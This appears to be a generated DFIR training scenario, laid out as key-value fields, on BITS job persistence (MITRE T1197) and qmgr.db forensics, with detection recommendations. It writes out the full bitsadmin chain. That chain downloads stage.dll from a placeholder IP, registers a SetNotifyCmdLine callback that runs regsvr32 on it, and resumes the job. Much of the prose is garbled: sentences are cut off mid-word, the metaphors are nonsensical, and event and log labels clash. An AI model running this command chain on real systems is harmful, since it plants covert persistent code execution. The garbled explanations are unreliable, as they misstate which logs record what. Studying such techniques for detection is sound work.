scenario.name: Microsoft & Mandiant DFIR — BITS Job Persistence & qmgr.db SetNotifyCmdLine Forensics (EventID 59 / 60 / 3)
scenario.overview: Imagine an intruder who abuses the building own patient overnight parcel-delivery courier to stay permanently inside the estate. First, the intruder registers an official background delivery job to fetch a remote parcel; second, they staple a secret post-delivery instruction card onto the parcel receipt telling the courier what program to launch the instant the box lands; third, once the parcel finishes arriving, the trusted system service host runs the intruder program automatically even across reboots. In this scenario (MITRE ATT&CK T1197, BITS Job Persistence & qmgr.db SetNotifyCmdLine Forensics), the attacker schedules a recurring download so the mailroom clerk later opens the package automatically. The attack unfolds in one continuous arc: create a BITS download job (so the transfer is logged as legitimate background work), persist a SetNotifyCmdLine callback inside qmgr.db (so completion launches attacker code), then let the BITS service host spawn regsvr32.exe after transfer completion (handing execution to the payload). Steps #1–#3 walk that chain end-to-end by covering job creation, qmgr.db persistence, and the svchost child process spawn. Primary detection correlates Bits-Client Operational EventID 3/59/60 with suspicious notify command lines and regsvr32 children parented by the BITS svchost instance.

specs.value: Ingest Microsoft-Windows-Bits-Client/Operational Event IDs 3, 59, 60, and 61 into the SIEM and alert on non-Microsoft domains or IP-literal URLs.

stages.title: Stage 1: BITS Transfer Job Creation & Remote File Addition (Bits-Client EventID 3 & 59)
stages.subtitle: Defense Evasion (T1197 - BITS Jobs)
stages.description: Walking up to the background delivery desk, the intruder schedules a new polite idle-time transfer job pointed at a remote web warehouse so the operating system itself quietly downloads the payload in the background. The attacker runs bitsadmin /create /download WinUpdateSync and bitsadmin /addfile WinUpdateSync https://198.51.100.88/stage.dll C:\Users\Public\stage.dll. The Microsoft-Windows-Bits-Client/Operational log records EventID 3 (BITS service created a new job) and EventID 59 (BITS started the transfer job with the associated URL) (logged in WinEvent Event 59 with LogChannel=Microsoft-Windows-Bits-Client/Operational, EventID=3 , Job Created / 59 , Transfer Started, JobTitle=WinUpdateSync, RemoteUrl=https://198.51.100.88/stage.dll so analysts can verify the exact actor and target artifact). Under the hood, the observed step executes bitsadmin.exe /create /download WinUpdateSync (which invokes Microsoft's signed Background Intelligent Transfer Service CLI utility , bitsadmin.exe to instantiate a new asynchronous download job queue so that creates a legitimate-looking background transfer container , masquerading as a Windows Update task under T1197 so all subsequent network connections and child processes execute under the trusted svchost.exe service rather than an untrusted attacker shell). Next, the follow-up artifact bitsadmin.exe /addfile WinUpdateSync https://198.51.100.88/stage.dll C:\Users\Public\stage.dll runs (which Calls bitsadmin.exe with /addfile to bind a remote HTTP/HTTPS staging URL and a local writable file destination path to the active BITS transfer jo so that offloads payload downloading to the Windows BITS service , svchost.exe so perimeter and host firewalls observe outbound HTTPS traffic originating from a signed Microsoft OS binary, while recording EventID 59 in Microsoft-Windows-Bits-Client/Operational). On the diagram, follow Step #1 / Link #1 (#1→ bitsadmin.exe /addfile WinUpdateSync https://198.51.100.88/stage.dll C:\Users\Public\stage.dll / ⇠#1 ACK 59) from Node ① (#1 External Staging Server (:443)) to Node ② (#2 Perimeter Firewall & NDR Tap), monitored by Node ⑥ (#6 qmgr.db ESE Queue Database).

stages.title: Stage 2: SetNotifyCmdLine Persistence & qmgr.db ESE Serialization
stages.subtitle: Persistence (T1197 - BITS SetNotifyCmdLine & qmgr.db)
stages.description: Before starting the delivery truck, the intruder attaches a hidden completion-notification order straight onto the job slip, writing their malicious executable command permanently into the delivery service master database file. The attacker configures bitsadmin /SetNotifyCmdLine WinUpdateSync C:\Windows\System32\regsvr32.exe "regsvr32.exe /s C:\Users\Public\stage.dll" and /SetMinRetryDelay WinUpdateSync 60. BITS serializes the job GUID, URL, local path, and notification command into the Extensible Storage Engine database C:\ProgramData\Microsoft\Network\Downloader\qmgr.db (or qmgr0.dat/qmgr1.dat) (logged in Sysmon Event 1 with EventID=1 , Sysmon ProcessCreate, NotifyProgram=C:\Windows\System32\regsvr32.exe, NotifyParameters=regsvr32.exe /s C:\Users\Public\stage.dll, ForensicDatabase=C:\ProgramData\Microsoft\Network\Downloader\qmgr.db so analysts can verify the exact actor and target artifact). Under the hood, the observed step executes bitsadmin.exe /SetNotifyCmdLine WinUpdateSync C:\Windows\System32\regsvr32.exe "regsvr32.exe /s C:\Users\Public\stage.dll" (which Configures a persistent BITS job completion/error callback command line via IBackgroundCopyJob2::SetNotifyCmdLine, serializing the executable and a so that establishes stealthy service-level persistence , T1197: whenever the BITS job finishes transferring or hits a retry condition, svchost.exe automatically launches the specified payload , e.g., regsvr32.exe or cmd.exe under SYSTEM/service authority). Next, the follow-up artifact bitsadmin.exe /SetMinRetryDelay WinUpdateSync 60 runs (which Configures the minimum retry interval in seconds , IBackgroundCopyJob::SetMinimumRetryDelay so the BITS service repeatedly re-triggers the job or n so that abuses Windows Background Intelligent Transfer Service , BITS · T1197 during "SetNotifyCmdLine Persistence & qmgr.db ESE Serialization" to perform living-off-the-land payload staging and persistent callback execution). On the diagram, follow Step #2 / Link #2 (#2→ bitsadmin.exe /SetNotifyCmdLine WinUpdateSync C:\Windows\System32\regsvr32.exe "regsvr32.exe /s C:\Users\Public\stage.dll" / ⇠#2 ACK 1) from Node ② (#2 Perimeter Firewall & NDR Tap) to Node ③ (#3 Enterprise Proxy (HTTP Range)), monitored by Node ⑥ (#6 qmgr.db ESE Queue Database).

keySpecs.value: Audit active BITS jobs via bitsadmin /list /allusers /verbose and parse C:\ProgramData\Microsoft\Network\Downloader\qmgr.db for historical deleted job records.

stages.title: Stage 3: BITS Transfer Completion (EventID 60) & svchost.exe Child Execution
stages.subtitle: Execution (T1197 - svchost.exe -k netsvcs Child Process)
stages.description: The moment the parcel touches down on disk, the delivery service stamps the job complete and its own trusted system host process immediately executes the stapled command line. Continuing the same characters and room from the previous beat, the operator performs two more concrete physical movements that an animator can stage without guessing, and each newly introduced prop has one explicit job. When bitsadmin /resume WinUpdateSync completes the HTTP download (User-Agent: Microsoft BITS/7.8), Bits-Client logs EventID 60 (BITS stopped transferring the job) and the service host process (svchost.exe -k netsvcs -s BITS) directly spawns regsvr32.exe /s C:\Users\Public\stage.dll (logged in Sysmon Event 1 with EventID=1 , Sysmon / 60 , Bits-Client Transfer Complete, ParentServiceHost=svchost.exe -k netsvcs -p -s BITS, SpawnedChild=regsvr32.exe /s C:\Users\Public\stage.dll, HttpUserAgent=Microsoft BITS/7.8 so analysts can verify the exact actor and target artifact). Under the hood, the observed step executes bitsadmin.exe /resume WinUpdateSync (which Instructs the BITS COM service to activate , /resume or finalize and commit , /complete the queued transfer job inside svchost.exe so that abuses Windows Background Intelligent Transfer Service , BITS · T1197 during "BITS Transfer Completion , EventID 60 & svchost.exe Child Execution" to perform living-off-the-land payload staging and persistent callback execution). Next, the follow-up artifact Bits-Client EventID 60: bytesTotal=184320 bytesTransferred=184320 runs (which executes the technical command / telemetry directive , Bits-Client EventID 60: bytesTotal=184320 bytesTransferred=184320 via System / Runtime Execu so that advances the scenario kill-chain under MITRE T1197 during "BITS Transfer Completion , EventID 60 & svchost.exe Child Execution" , When bitsadmin /resume WinUpdateSync completes the HTTP download , User-Agent: Microsoft BITS/7 while generating verifiable host or network telemetry for DFIR attribution). On the diagram, follow Step #3 / Link #3 (#3→ regsvr32.exe /s C:\Users\Public\stage.dll / ⇠#3 ACK 1) from Node ③ (#3 Enterprise Proxy (HTTP Range)) to Node ④ (#4 svchost.exe (BITS Service)), monitored by Node ⑥ (#6 qmgr.db ESE Queue Database).

keySpecs.value: Alert on any child process (regsvr32.exe, cmd.exe, powershell.exe, rundll32.exe) spawned by svchost.exe hosting the BITS service.
